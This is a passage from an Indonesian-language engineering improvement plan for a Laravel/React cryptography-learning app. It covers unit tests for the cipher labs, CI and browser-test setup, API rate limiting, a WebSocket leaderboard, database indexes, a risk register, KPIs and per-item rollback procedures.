    it('encrypts and produces numeric output', () => {
        const result = runSimulation('rsa-lab', 'Hi', '', 'encrypt', 'ascii', 'decimal');
        expect(result.output).toBeTruthy();
    });

    it('generates steps showing modular exponentiation', () => {
        const result = runSimulation('rsa-lab', 'A', '', 'encrypt', 'ascii', 'decimal');
        expect(result.steps.length).toBeGreaterThan(0);
    });
});

// ─── SHA Lab ─────────────────────────────────────────────────
describe('SHA Lab', () => {
    it('produces consistent hash for same input', () => {
        const r1 = runSimulation('sha-lab', 'test', '', 'encrypt', 'ascii', 'hex');
        const r2 = runSimulation('sha-lab', 'test', '', 'encrypt', 'ascii', 'hex');
        expect(r1.output).toBe(r2.output);
    });

    it('produces different hash for different input (avalanche)', () => {
        const r1 = runSimulation('sha-lab', 'test1', '', 'encrypt', 'ascii', 'hex');
        const r2 = runSimulation('sha-lab', 'test2', '', 'encrypt', 'ascii', 'hex');
        expect(r1.output).not.toBe(r2.output);
    });

    it('produces 64-character hex output (SHA-256 length)', () => {
        const result = runSimulation('sha-lab', 'hello', '', 'encrypt', 'ascii', 'hex');
        expect(result.output.length).toBe(64);
    });
});

// ─── Digital Signature Lab ───────────────────────────────────
describe('Digital Signature Lab', () => {
    it('produces signature output', () => {
        const result = runSimulation('digital-signature-lab', 'Document', '', 'encrypt', 'ascii', 'hex');
        expect(result.output).toBeTruthy();
    });

    it('verify mode produces verification result', () => {
        const result = runSimulation('digital-signature-lab', 'Document', '', 'decrypt', 'ascii', 'ascii');
        expect(result.output).toBeTruthy();
    });
});

// ─── Format Conversion ──────────────────────────────────────
describe('Format Conversion', () => {
    it('normalizeInputToText converts hex to text', () => {
        const result = normalizeInputToText('48656c6c6f', 'hex');
        expect(result).toBe('Hello');
    });

    it('normalizeInputToText handles ascii passthrough', () => {
        const result = normalizeInputToText('Hello', 'ascii');
        expect(result).toBe('Hello');
    });

    it('formatOutputValue converts to hex', () => {
        const result = formatOutputValue('Hello', 'hex');
        expect(result.toLowerCase()).toContain('48656c6c6f');
    });

    it('formatLabel returns human-readable labels', () => {
        expect(formatLabel('ascii')).toBeTruthy();
        expect(formatLabel('hex')).toBeTruthy();
        expect(formatLabel('binary')).toBeTruthy();
        expect(formatLabel('base64')).toBeTruthy();
    });
});

// ─── Utility Functions ───────────────────────────────────────
describe('Utility Functions', () => {
    it('recommendedInputFormatByLab returns valid format', () => {
        const labs = ['caesar-cipher-lab', 'vigenere-cipher-lab', 'aes-lab', 'rsa-lab', 'sha-lab', 'digital-signature-lab'];
        for (const lab of labs) {
            const format = recommendedInputFormatByLab(lab);
            expect(['ascii', 'hex', 'binary', 'base64', 'decimal']).toContain(format);
        }
    });

    it('conceptLensByLab returns points for each lab', () => {
        const labs = ['caesar-cipher-lab', 'vigenere-cipher-lab', 'aes-lab', 'rsa-lab', 'sha-lab', 'digital-signature-lab'];
        for (const lab of labs) {
            const lens = conceptLensByLab(lab);
            expect(lens.points.length).toBeGreaterThan(0);
        }
    });

    it('validationErrorByLab returns null for valid input', () => {
        const error = validationErrorByLab('caesar-cipher-lab', 'Hello', '3', 'encrypt', 'ascii');
        expect(error).toBeNull();
    });

    it('defaultTextByLab returns non-empty string', () => {
        const labs = ['caesar-cipher-lab', 'vigenere-cipher-lab', 'aes-lab', 'rsa-lab', 'sha-lab', 'digital-signature-lab'];
        for (const lab of labs) {
            expect(defaultTextByLab(lab).length).toBeGreaterThan(0);
        }
    });
});
```

**Langkah 3**: Tambahkan ke CI pipeline

```yaml
# .github/workflows/tests.yml — tambahkan job
  vitest:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: pnpm
      - run: pnpm install --frozen-lockfile
      - run: pnpm vitest run --coverage
```

**Langkah 4**: Tambahkan npm script

```json
{
    "scripts": {
        "test:unit": "vitest run",
        "test:unit:watch": "vitest",
        "test:unit:coverage": "vitest run --coverage"
    }
}
```

**File yang dimodifikasi/dibuat:**
1. `vitest.config.ts` — konfigurasi baru
2. `resources/js/lib/__tests__/lab-simulations.test.ts` — test suite baru
3. `.github/workflows/tests.yml` — tambah vitest job
4. `package.json` — tambah scripts

---

### R06: Expand E2E Browser Coverage

**Severity**: 🟡 Medium | **Effort**: Low | **Phase**: 2

#### 3.6.1 Analisis Masalah

```ts
// playwright.config.ts — hanya Chromium
projects: [
    {
        name: 'chromium',
        use: { ...devices['Desktop Chrome'] },
    },
],
```

#### 3.6.2 Solusi

**Langkah 1**: Update `playwright.config.ts`

```ts
projects: [
    {
        name: 'chromium',
        use: { ...devices['Desktop Chrome'] },
    },
    {
        name: 'firefox',
        use: { ...devices['Desktop Firefox'] },
    },
    {
        name: 'webkit',
        use: { ...devices['Desktop Safari'] },
    },
    // Mobile viewports
    {
        name: 'mobile-chrome',
        use: { ...devices['Pixel 7'] },
    },
    {
        name: 'mobile-safari',
        use: { ...devices['iPhone 14'] },
    },
],
```

**Langkah 2**: Update CI workflow

```yaml
# .github/workflows/tests.yml — E2E section
- name: Install Playwright Browsers
  run: npx playwright install --with-deps chromium firefox webkit
```

**Langkah 3**: Audit E2E tests untuk browser-specific issues

```bash
# Run locally untuk identifikasi failures
npx playwright test --project=firefox
npx playwright test --project=webkit
```

**File yang dimodifikasi:**
1. `playwright.config.ts` — tambah browser projects
2. `.github/workflows/tests.yml` — install semua browsers

---

### R07: Granular API Rate Limiting

**Severity**: 🟡 Medium | **Effort**: Medium | **Phase**: 2

#### 3.7.1 Analisis Masalah

Rate limiting saat ini:
- Login: 5 requests/menit (di `FortifyServiceProvider`)
- 2FA: 5 requests/menit
- **Tidak ada** rate limiting untuk: `quizSubmit`, `quickStore`, `sessionSummary`, `store` (challenge), daily reward claim

#### 3.7.2 Solusi

**Langkah 1**: Definisikan rate limiters di `AppServiceProvider`

```php
// app/Providers/AppServiceProvider.php

use Illuminate\Cache\RateLimiting\Limit;
use Illuminate\Support\Facades\RateLimiter;

public function boot(): void
{
    // Challenge submission — 30 per menit (quiz mode bisa rapid-fire)
    RateLimiter::for('challenge-submit', function (Request $request) {
        return Limit::perMinute(30)->by($request->user()?->id ?: $request->ip());
    });

    // Quiz question submission — 60 per menit (1 per detik max)
    RateLimiter::for('quiz-submit', function (Request $request) {
        return Limit::perMinute(60)->by($request->user()?->id ?: $request->ip());
    });

    // Session summary — 5 per menit (hanya dipanggil sekali per session)
    RateLimiter::for('session-summary', function (Request $request) {
        return Limit::perMinute(5)->by($request->user()?->id ?: $request->ip());
    });

    // Daily reward claim — 2 per menit
    RateLimiter::for('daily-reward', function (Request $request) {
        return Limit::perMinute(2)->by($request->user()?->id ?: $request->ip());
    });

    // General API — 120 per menit
    RateLimiter::for('api-general', function (Request $request) {
        return Limit::perMinute(120)->by($request->user()?->id ?: $request->ip());
    });
}
```

**Langkah 2**: Apply ke routes

```php
// routes/web.php

// Challenge routes
Route::post('/challenges/{challenge}/submit', [ChallengeSubmissionController::class, 'store'])
    ->middleware('throttle:challenge-submit');

Route::post('/challenges/{challenge}/quick', [ChallengeSubmissionController::class, 'quickStore'])
    ->middleware('throttle:challenge-submit');

Route::post('/challenges/{challenge}/quiz-submit', [ChallengeSubmissionController::class, 'quizSubmit'])
    ->middleware('throttle:quiz-submit');

Route::post('/challenges/{challenge}/session-summary', [ChallengeSubmissionController::class, 'sessionSummary'])
    ->middleware('throttle:session-summary');

// Daily reward
Route::post('/daily-rewards/claim', [DailyRewardController::class, 'claim'])
    ->middleware('throttle:daily-reward');
```

**Langkah 3**: Tulis test

```php
it('rate limits quiz submissions to 60 per minute', function () {
    $user = User::factory()->create();
    $challenge = Challenge::factory()->hasQuestions(1)->create();

    actingAs($user);

    for ($i = 0; $i < 61; $i++) {
        $response = postJson(route('challenges.quiz-submit', $challenge), [
            'session_id' => Str::uuid()->toString(),
            'challenge_question_id' => $challenge->questions->first()->id,
            'answer' => 'test',
            'elapsed_ms' => 5000,
            'question_index' => 0,
        ]);

        if ($i < 60) {
            $response->assertStatus(200)->assertJsonMissing(['message' => 'Too Many Attempts.']);
        } else {
            $response->assertStatus(429);
        }
    }
});
```

**File yang dimodifikasi:**
1. `app/Providers/AppServiceProvider.php` — rate limiter definitions
2. `routes/web.php` — apply throttle middleware
3. `tests/Feature/RateLimitingTest.php` — test baru

---

### R08: Real-Time Leaderboard via WebSocket

**Severity**: 🟡 Medium | **Effort**: High | **Phase**: 2

#### 3.8.1 Solusi: Laravel Reverb + Echo

**Langkah 1**: Install Laravel Reverb

```bash
php artisan install:broadcasting
composer require laravel/reverb
php artisan reverb:install
```

**Langkah 2**: Buat event untuk leaderboard update

```php
// app/Events/LeaderboardUpdated.php

class LeaderboardUpdated implements ShouldBroadcast
{
    use Dispatchable, InteractsWithSockets, SerializesModels;

    public function __construct(
        public readonly string $timeframe,
        public readonly array $top3,
    ) {}

    public function broadcastOn(): array
    {
        return [new Channel('leaderboard')];
    }

    public function broadcastAs(): string
    {
        return 'leaderboard.updated';
    }
}
```

**Langkah 3**: Dispatch event saat skor berubah

```php
// Di XpService::awardXpAndPoints() atau listener XpAwarded
LeaderboardUpdated::dispatch(
    'weekly',
    $this->leaderboardService->getTop3Users('weekly')->toArray(),
);
```

**Langkah 4**: Frontend listener

```tsx
// resources/js/hooks/useLeaderboardChannel.ts
import { useEffect, useState } from 'react';
import Echo from 'laravel-echo';

export function useLeaderboardChannel(timeframe: string) {
    const [top3, setTop3] = useState<LeaderboardEntry[]>([]);

    useEffect(() => {
        const channel = window.Echo.channel('leaderboard');

        channel.listen('.leaderboard.updated', (event: { timeframe: string; top3: LeaderboardEntry[] }) => {
            if (event.timeframe === timeframe) {
                setTop3(event.top3);
            }
        });

        return () => {
            channel.stopListening('.leaderboard.updated');
            window.Echo.leave('leaderboard');
        };
    }, [timeframe]);

    return top3;
}
```

**File yang dimodifikasi/dibuat:**
1. `app/Events/LeaderboardUpdated.php` — event baru
2. `app/Listeners/BroadcastLeaderboardUpdate.php` — listener baru
3. `resources/js/hooks/useLeaderboardChannel.ts` — hook baru
4. Leaderboard component — integrate hook
5. `config/broadcasting.php` — Reverb configuration
6. `.env` — Reverb credentials

---

### R09: Database Indexing Optimization

**Severity**: 🟡 Medium | **Effort**: Low | **Phase**: 1

#### 3.9.1 Analisis Query Patterns

Berdasarkan analisis `LeaderboardService` dan `MasteryService`:

```php
// LeaderboardService::timeframeLeaders() — aggregates challenge_submissions
ChallengeSubmission::query()
    ->where('is_correct', true)
    ->where('submitted_at', '>=', $since)
    ->groupBy('user_id')
    ->selectRaw('user_id, SUM(score + streak_bonus) as total_points');

// MasteryService::getUserMastery() — joins topics
ChallengeSubmission::query()
    ->where('user_id', $userId)
    ->whereHas('challengeQuestion.topic');
```

#### 3.9.2 Solusi: Targeted Composite Indexes

```php
// database/migrations/xxxx_add_performance_indexes.php

public function up(): void
{
    Schema::table('challenge_submissions', function (Blueprint $table) {
        // Leaderboard aggregation: WHERE is_correct AND submitted_at >= X GROUP BY user_id
        $table->index(['is_correct', 'submitted_at', 'user_id'], 'idx_leaderboard_agg');

        // Session streak calculation (R01)
        $table->index(
            ['user_id', 'challenge_id', 'session_id', 'question_index'],
            'idx_session_streak'
        );
    });

    Schema::table('lesson_progress', function (Blueprint $table) {
        // Dashboard: count completed lessons per user
        $table->index(['user_id', 'completed_at'], 'idx_user_completion');
    });

    Schema::table('enrollments', function (Blueprint $table) {
        // Dashboard: recent courses with progress
        $table->index(['user_id', 'updated_at'], 'idx_user_recent_enrollment');
    });
}

public function down(): void
{
    Schema::table('challenge_submissions', function (Blueprint $table) {
        $table->dropIndex('idx_leaderboard_agg');
        $table->dropIndex('idx_session_streak');
    });

    Schema::table('lesson_progress', function (Blueprint $table) {
        $table->dropIndex('idx_user_completion');
    });

    Schema::table('enrollments', function (Blueprint $table) {
        $table->dropIndex('idx_user_recent_enrollment');
    });
}
```

**Langkah verifikasi**: Jalankan `EXPLAIN ANALYZE` pada query leaderboard sebelum dan sesudah.

**File yang dimodifikasi:**
1. `database/migrations/xxxx_add_performance_indexes.php` — migration baru

---

### R10–R15: Phase 3 Items (Ringkasan)

#### R10: OpenAPI/Swagger Documentation
- Install `darkaonline/l5-swagger` atau `dedoc/scramble`
- Annotate semua controller methods dengan OpenAPI attributes
- Auto-generate spec dari route definitions
- Serve di `/api/documentation`

#### R11: Feature Flags System
- Install `laravel/pennant`
- Definisikan flags di `app/Features/`
- Wrap fitur baru dengan `Feature::active('feature-name')`
- Admin UI untuk toggle flags

#### R12: i18n/Localization
- Extract semua hardcoded strings ke `lang/en/*.php` dan `lang/id/*.php`
- Frontend: gunakan `react-i18next` atau Inertia shared translations
- Locale switcher di UI
- Wrap dengan feature flag (R11)

#### R13: A/B Testing Framework
- Extend feature flags (R11) dengan variant support
- Track variant assignment di `user_experiments` table
- Analytics integration untuk measuring outcomes

#### R14: APM Setup
- Enable Sentry Performance di `config/sentry.php`
- Add `traces_sample_rate` configuration
- Custom spans untuk critical paths (leaderboard, dashboard)
- Alert rules untuk P95 latency thresholds

#### R15: Admin Analytics Enhancements
- Cohort analysis (retention by signup week)
- Gamification funnel (enrollment → lesson → quiz → challenge → certificate)
- XP/Points economy health dashboard
- Export to CSV functionality

---

## 4. Resource & Responsibility Matrix

### 4.1 RACI Matrix

| Task | Backend Dev | Frontend Dev | DevOps | QA | Tech Lead |
|------|:-----------:|:------------:|:------:|:--:|:---------:|
| R01: Server-side streak | **R/A** | I | — | **C** | **A** |
| R02: Remove correctAnswer | **R** | **R** | — | **C** | **A** |
| R03: Avatar BLOB migration | **R/A** | I | **C** | **C** | **A** |
| R04: CSP nonce | **R** | **R** | **C** | **C** | **A** |
| R05: Lab simulation tests | I | **R/A** | — | **C** | **A** |
| R06: E2E browser coverage | — | **R** | **R** | **A** | I |
| R07: Rate limiting | **R/A** | — | **C** | **C** | **A** |
| R08: WebSocket leaderboard | **R** | **R** | **R** | **C** | **A** |
| R09: DB indexing | **R/A** | — | **C** | — | **A** |
| R10: API documentation | **R/A** | — | — | **C** | **A** |
| R11: Feature flags | **R/A** | **R** | — | **C** | **A** |
| R12: i18n | **R** | **R/A** | — | **C** | **A** |
| R13: A/B testing | **R/A** | **R** | — | **C** | **A** |
| R14: APM | **R** | — | **R/A** | — | **A** |
| R15: Admin analytics | **R** | **R** | — | **C** | **A** |

> **R** = Responsible, **A** = Accountable, **C** = Consulted, **I** = Informed

### 4.2 Estimasi Effort (Person-Days)

| Phase | Backend | Frontend | DevOps | QA | Total |
|-------|---------|----------|--------|-----|-------|
| Phase 1 (W1–2) | 8 | 2 | 1 | 2 | **13** |
| Phase 2 (W3–6) | 10 | 12 | 3 | 3 | **28** |
| Phase 3 (W7–12) | 18 | 14 | 2 | 4 | **38** |
| **Total** | **36** | **28** | **6** | **9** | **79** |

### 4.3 Skill Requirements

| Role | Skills Required | Min. Experience |
|------|----------------|-----------------|
| Backend Developer | Laravel 13, PHP 8.3+, MySQL optimization, Redis, WebSocket | 2+ tahun Laravel |
| Frontend Developer | React 19, TypeScript, Vitest, Playwright, Inertia.js | 2+ tahun React |
| DevOps Engineer | CI/CD (GitHub Actions), Nginx, Supervisor, Laravel Reverb | 1+ tahun |
| QA Engineer | Pest PHP, Playwright, Security testing | 1+ tahun |

---

## 5. Dependency Graph

```
                    ┌─────────────────────────────────────────────────┐
                    │              PHASE 1 (Week 1-2)                 │
                    │                                                 │
                    │  ┌─────┐   ┌─────┐   ┌─────┐                  │
                    │  │ R02 │   │ R01 │   │ R09 │                  │
                    │  │Remove│   │Srvr │   │ DB  │                  │
                    │  │crrAns│   │Strk │   │Index│                  │
                    │  └──┬──┘   └──┬──┘   └──┬──┘                  │
                    │     │         │          │                      │
                    │  ┌──┴──┐   ┌──┴──┐      │                     │
                    │  │ R03 │   │ R04 │      │                     │
                    │  │Avatr│   │ CSP │      │                     │
                    │  │Migrt│   │Nonce│      │                     │
                    │  └─────┘   └─────┘      │                     │
                    └─────────────┬────────────┘                     │
                                  │                                   │
                    ┌─────────────▼───────────────────────────────────┘
                    │              PHASE 2 (Week 3-6)                 │
                    │                                                 │
                    │  ┌─────┐   ┌─────┐   ┌─────┐                  │
                    │  │ R05 │   │ R06 │   │ R14 │                  │
                    │  │ Lab │   │ E2E │   │ APM │                  │
                    │  │Tests│   │Brows│   │Setup│                  │
                    │  └─────┘   └─────┘   └──┬──┘                  │
                    │                          │                      │
                    │  ┌─────┐──────────┐      │                     │
                    │  │ R07 │   │ R08  │      │                     │
                    │  │Rate │   │WebSkt│      │                     │
                    │  │Limit│   │Leadr │◄─────┘ (R09 indexes)      │
                    │  └──┬──┘   └──┬───┘                            │
                    └─────┼─────────┼────────────────────────────────┘
                          │         │
                    ┌─────▼─────────▼────────────────────────────────┐
                    │              PHASE 3 (Week 7-12)               │
                    │                                                 │
                    │  ┌─────┐   ┌─────┐                             │
                    │  │ R11 │   │ R10 │                             │
                    │  │Feat │   │ API │                             │
                    │  │Flags│   │ Doc │                             │
                    │  └──┬──┘   └─────┘                             │
                    │     │                                           │
                    │  ┌──▼──┐   ┌─────┐                             │
                    │  │ R12 │   │ R15 │◄── (R14 APM data)          │
                    │  │i18n │   │Admin│                             │
                    │  └─────┘   │Analy│                             │
                    │            └─────┘                             │
                    │  ┌─────┐                                       │
                    │  │ R13 │◄── (R11 feature flags)               │
                    │  │ A/B │                                       │
                    │  └─────┘                                       │
                    └────────────────────────────────────────────────┘
```

### 5.1 Critical Path

```
R01 (3d) → R07 (5d) → Phase 2 QA (1d) = 9 hari
R09 (1d) → R08 Backend (3d) → R08 Frontend (3d) → Phase 2 QA (1d) = 8 hari
R11 (8d) → R12 (10d) → Phase 3 QA (2d) = 20 hari
```

**Critical path total**: R01 → R07 → R11 → R12 = **26 hari kerja** (5.2 minggu)

### 5.2 Dependency Rules

| Task | Hard Dependencies | Soft Dependencies |
|------|-------------------|-------------------|
| R01 | — | — |
| R02 | — | — |
| R03 | — | — |
| R04 | — | — |
| R05 | — | — |
| R06 | — | R05 (shared test infra) |
| R07 | R01 (streak fix harus selesai sebelum rate limit) | — |
| R08 | R09 (indexes untuk query performance) | R07 (rate limit WebSocket) |
| R09 | — | — |
| R10 | — | R07 (document rate limits) |
| R11 | — | — |
| R12 | R11 (wrap dengan feature flag) | — |
| R13 | R11 (extend feature flag system) | R14 (metrics) |
| R14 | — | — |
| R15 | R14 (APM data untuk analytics) | R09 (optimized queries) |

---

## 6. Risk Register

| ID | Risiko | Probabilitas | Dampak | Severity | Mitigasi | Contingency |
|----|--------|:------------:|:------:|:--------:|----------|-------------|
| RK01 | **R01 breaking existing quiz sessions** — Perubahan streak calculation bisa menghasilkan skor berbeda untuk session yang sedang berlangsung | Medium | High | 🔴 Critical | Deploy saat low-traffic (malam hari). Tambahkan feature flag untuk gradual rollout. Log perbedaan skor lama vs baru selama 48 jam. | Rollback ke client-side calculation via feature flag. Reprocess affected sessions. |
| RK02 | **R02 frontend regression** — Komponen yang bergantung pada `correctAnswer` field bisa crash | Low | Medium | 🟡 Medium | Audit semua frontend references sebelum deploy. Tambahkan null-safe access (`response?.correctAnswer`). | Hotfix frontend bundle. Sementara kembalikan field dengan value `"[REDACTED]"`. |
| RK03 | **R03 data loss during BLOB migration** — File gagal tersimpan tapi BLOB sudah di-null-kan | Low | High | 🔴 Critical | **Jangan null-kan BLOB** sampai file terverifikasi. Two-phase migration: (1) copy to file, (2) drop column setelah verifikasi. Full database backup sebelum migration. | Restore dari backup. Re-run migration command. |
| RK04 | **R04 CSP nonce breaking third-party scripts** — Nonce requirement bisa memblokir Google Fonts atau analytics scripts | Medium | Medium | 🟡 Medium | Audit semua external resources. Tambahkan domain ke CSP whitelist. Test di staging dengan CSP report-only mode dulu. | Deploy dengan `Content-Security-Policy-Report-Only` header dulu selama 1 minggu. |
| RK05 | **R05 flaky lab tests** — Simulasi kriptografi mungkin memiliki floating-point atau timing issues | Medium | Low | 🟢 Low | Gunakan deterministic inputs. Avoid timing-dependent assertions. Use `toBeCloseTo()` untuk floating-point. | Mark flaky tests sebagai `.skip` sementara, fix di sprint berikutnya. |
| RK06 | **R06 cross-browser E2E failures** — Firefox/WebKit mungkin memiliki behavior berbeda | High | Low | 🟡 Medium | Jalankan E2E suite di semua browsers secara lokal sebelum merge. Gunakan Playwright's built-in retry. | Disable failing browser project di CI sementara, fix incrementally. |
| RK07 | **R07 rate limiting terlalu ketat** — Legitimate users terkena rate limit saat quiz cepat | Medium | Medium | 🟡 Medium | Set limit berdasarkan analisis traffic pattern aktual. Monitor 429 responses di production. Gunakan sliding window, bukan fixed window. | Naikkan limit via config tanpa redeploy (gunakan Redis-backed config). |
| RK08 | **R08 WebSocket scalability** — Reverb mungkin tidak handle concurrent connections dengan baik | Medium | Medium | 🟡 Medium | Load test dengan k6/Artillery sebelum production. Set connection limits. Horizontal scaling plan. | Fallback ke polling-based leaderboard (existing implementation). |
| RK09 | **R09 index migration locking table** — `ALTER TABLE` pada tabel besar bisa lock writes | Low | High | 🔴 Critical | Gunakan `ALGORITHM=INPLACE` untuk MySQL 8+. Run di maintenance window. Estimate table size sebelumnya. | Gunakan `pt-online-schema-change` (Percona toolkit) untuk zero-downtime migration. |
| RK10 | **R12 translation quality** — Terjemahan otomatis atau asal-asalan merusak UX | Medium | Medium | 🟡 Medium | Gunakan professional translator atau native speaker review. Implement translation review workflow. | Ship dengan English-only, tambahkan Indonesian incrementally per-module. |

### 6.1 Risk Heat Map

```
         ┌─────────────────────────────────────────┐
         │           DAMPAK                         │
         │    Low      Medium      High             │
    ┌────┼──────────┬───────────┬──────────┐        │
  P │High│  RK06    │           │          │        │
  R │    │          │           │          │        │
  O ├────┼──────────┼───────────┼──────────┤        │
  B │Med │  RK05    │ RK04,RK07 │ RK01     │        │
  A │    │          │ RK08,RK10 │          │        │
  B ├────┼──────────┼───────────┼──────────┤        │
    │Low │          │ RK02      │ RK03,RK09│        │
    └────┴──────────┴───────────┴──────────┘        │
         └─────────────────────────────────────────┘
```

---

## 7. Monitoring & Success Metrics

### 7.1 Key Performance Indicators (KPIs)

#### Phase 1 KPIs

| Metric | Baseline (Saat Ini) | Target | Measurement Method |
|--------|---------------------|--------|-------------------|
| Score manipulation incidents | Unknown (undetected) | 0 per month | Audit log: compare client vs server streak values |
| Answer leak exposure | 100% responses contain answer | 0% for quickStore | Automated API response schema test |
| Average `users` row size | ~70KB (with BLOB) | ~2KB (without BLOB) | `SELECT AVG(LENGTH(avatar_image)) FROM users` |
| CSP violation reports | N/A | <10 per week (after stabilization) | CSP `report-uri` endpoint |
| Leaderboard query P95 | Unmeasured | <100ms | `EXPLAIN ANALYZE` + Sentry Performance |

#### Phase 2 KPIs

| Metric | Baseline | Target | Measurement Method |
|--------|----------|--------|-------------------|
| Lab simulation test coverage | 0% | >90% lines | Vitest coverage report |
| E2E browser coverage | 1 browser (Chromium) | 3 browsers + 2 mobile | Playwright CI report |
| 429 rate limit responses | 0 (no limiting) | <0.1% of total requests | Nginx access log analysis |
| Leaderboard update latency | N/A (polling) | <500ms (WebSocket) | Client-side performance measurement |
| Sentry Performance traces | 0 | 100% of critical paths | Sentry dashboard |

#### Phase 3 KPIs

| Metric | Baseline | Target | Measurement Method |
|--------|----------|--------|-------------------|
| API documentation coverage | 0 endpoints | 100% public endpoints | OpenAPI spec validation |
| Feature flag adoption | 0 flags | All new features behind flags | Pennant dashboard |
| i18n string coverage | 0% Indonesian | >95% UI strings translated | Translation coverage script |
| A/B test velocity | 0 experiments/month | 2+ experiments/month | Experiment tracking table |
| Admin dashboard load time | ~1000ms | <500ms | Sentry Performance |

### 7.2 Monitoring Dashboard Setup

```yaml
# Recommended monitoring stack
Metrics:
  - Sentry Performance (APM)
  - Laravel Telescope (local development)
  - Redis INFO (cache hit rates)

Alerts:
  - P95 response time > 1000ms → Slack notification
  - Error rate > 1% → PagerDuty
  - 429 responses > 5% → Slack notification
  - CSP violations spike → Email to security team
  - WebSocket connection drops > 10/min → Slack notification

Dashboards:
  - Gamification Economy Health:
    - Total XP awarded per day
    - Points inflation rate
    - Streak distribution histogram
    - Badge earn rate by type
  - Security:
    - CSP violation count by directive
    - Rate limit hit count by endpoint
    - Failed login attempts
    - Suspicious streak bonus patterns
```

### 7.3 Automated Health Checks

```php
// Extend existing /health endpoint
Route::get('/health', function () {
    return response()->json([
        'status' => 'ok',
        'checks' => [
            'database' => DB::connection()->getPdo() ? 'ok' : 'fail',
            'cache' => Cache::store()->get('health_check_ping') !== null ? 'ok' : 'fail',
            'queue' => Queue::size('default') < 1000 ? 'ok' : 'warning',
            'reverb' => /* WebSocket health check */ 'ok',
            'storage' => Storage::disk('public')->exists('.gitignore') ? 'ok' : 'fail',
        ],
        'version' => config('app.version'),
        'timestamp' => now()->toIso8601String(),
    ]);
});
```

---

## 8. Rollback Strategy

### 8.1 General Rollback Principles

1. **Setiap deployment harus reversible** dalam <15 menit
2. **Database migrations harus memiliki `down()` method** yang teruji
3. **Feature flags** digunakan untuk semua perubahan behavior
4. **Blue-green deployment** untuk zero-downtime rollback

### 8.2 Per-Item Rollback Procedures

#### R01: Server-Side Streak — Rollback

```bash
# Severity: HIGH — Rollback dalam 5 menit
# Strategi: Feature flag

# 1. Disable feature flag
php artisan pennant:purge server-side-streak

# 2. Atau revert code dan redeploy
git revert HEAD --no-edit
git push origin main

# 3. Verify: pastikan quiz sessions menggunakan client-side calculation lagi
# Monitor: check Sentry untuk errors terkait streak calculation
```

**Data recovery**: Jika skor sudah terlanjur salah dihitung:
```sql
-- Identifikasi sessions yang terpengaruh (deployed_at = waktu deploy R01)
SELECT session_id, user_id, SUM(streak_bonus) as total_streak_bonus
FROM challenge_submissions
WHERE created_at >= '2026-XX-XX 00:00:00'  -- waktu deploy
  AND session_id IS NOT NULL
GROUP BY session_id, user_id
HAVING total_streak_bonus > 50;  -- threshold anomali

-- Recalculate jika diperlukan (manual review per session)
```

---

#### R02: Remove correctAnswer — Rollback

```bash
# Severity: LOW — Rollback dalam 2 menit
# Strategi: Code revert

# 1. Revert commit
git revert <commit-hash> --no-edit
git push origin main

# 2. Redeploy
php artisan optimize:clear
```

**Catatan**: Rollback ini aman karena menambahkan kembali field yang sebelumnya ada. Tidak ada data loss.

---

#### R03: Avatar BLOB Migration — Rollback

```bash
# Severity: CRITICAL — Rollback memerlukan planning
# Strategi: Two-phase, JANGAN drop kolom sebelum verifikasi

# Skenario A: Migration command gagal di tengah jalan
# → Tidak masalah, BLOB masih ada. Re-run command.
php artisan avatars:migrate-blobs

# Skenario B: Sudah drop kolom BLOB, perlu rollback
php artisan migrate:rollback --step=1
# Ini akan re-add avatar_image dan avatar_mime_type columns

# Skenario C: File storage corrupt
# → Restore dari database backup (BLOB masih ada di backup)
mysql -u root -p crypter < backup_before_avatar_migration.sql
```

**Pre-deployment checklist:**
- [ ] Full database backup sebelum migration
- [ ] Verify backup bisa di-restore
- [ ] Run `avatars:migrate-blobs --dry-run` dulu
- [ ] Verify file count matches user count with BLOBs
- [ ] **Jangan** run drop-column migration sampai 48 jam setelah file migration

---

#### R04: CSP Nonce — Rollback

```bash
# Severity: MEDIUM — Rollback dalam 5 menit
# Strategi: Revert ke unsafe-inline (temporary)

# Opsi 1: Revert middleware
git revert <commit-hash> --no-edit

# Opsi 2: Switch ke report-only mode (lebih aman)
# Di SecurityHeaders.php, ganti:
#   Content-Security-Policy → Content-Security-Policy-Report-Only
# Ini memungkinkan semua inline styles sambil mengumpulkan violation reports
```

**Staged rollback approach:**
1. Pertama deploy dengan `Content-Security-Policy-Report-Only` (1 minggu)
2. Analisis violation reports
3. Fix semua violations
4. Switch ke enforcing `Content-Security-Policy`
5. Jika ada masalah, kembali ke report-only

---

#### R07: Rate Limiting — Rollback

```bash
# Severity: LOW — Rollback dalam 2 menit
# Strategi: Remove middleware dari routes

# 1. Hapus throttle middleware dari routes/web.php
# 2. Atau naikkan limit ke angka sangat tinggi
RateLimiter::for('quiz-submit', fn () => Limit::perMinute(10000));

# 3. Clear rate limit cache
php artisan cache:clear
```

---

#### R08: WebSocket Leaderboard — Rollback

```bash
# Severity: LOW — Graceful degradation built-in
# Strategi: Frontend fallback ke polling

# 1. Stop Reverb server
supervisorctl stop reverb

# 2. Frontend otomatis fallback ke polling (jika diimplementasi dengan fallback)
# Atau disable WebSocket feature flag
php artisan pennant:purge realtime-leaderboard
```

**Catatan**: Existing polling-based leaderboard tetap berfungsi. WebSocket adalah enhancement, bukan replacement.

---

#### R09: Database Indexes — Rollback

```bash
# Severity: LOW — Rollback aman
# Strategi: Drop indexes via migration rollback

php artisan migrate:rollback --step=1

# Verify: indexes removed
mysql -e "SHOW INDEX FROM challenge_submissions" crypter
```

**Catatan**: Menghapus index tidak menghilangkan data, hanya memperlambat query. Aman untuk rollback kapan saja.

---

### 8.3 Emergency Rollback Checklist

Untuk **setiap** deployment, ikuti checklist ini:

```markdown
## Pre-Deployment
- [ ] Database backup completed and verified
- [ ] Git tag created: `pre-deploy-YYYY-MM-DD-HHMM`
- [ ] Rollback procedure documented and tested
- [ ] Feature flag configured (if applicable)
- [ ] Staging environment tested

## Deployment
- [ ] Deploy to production
- [ ] Run migrations (if any)
- [ ] Clear caches: `php artisan optimize:clear`
- [ ] Restart queue workers: `supervisorctl restart all`
- [ ] Verify health check: `curl https://crypter.app/health`

## Post-Deployment Monitoring (15 menit)
- [ ] Error rate normal (<0.1%)
- [ ] Response time normal (P95 <1000ms)
- [ ] No 500 errors in Sentry
- [ ] Key user flows working (login, quiz, leaderboard)
- [ ] WebSocket connections stable (if R08 deployed)

## Rollback Trigger Criteria
Rollback SEGERA jika:
- [ ] Error rate >5% selama >2 menit
- [ ] P95 response time >3000ms selama >5 menit
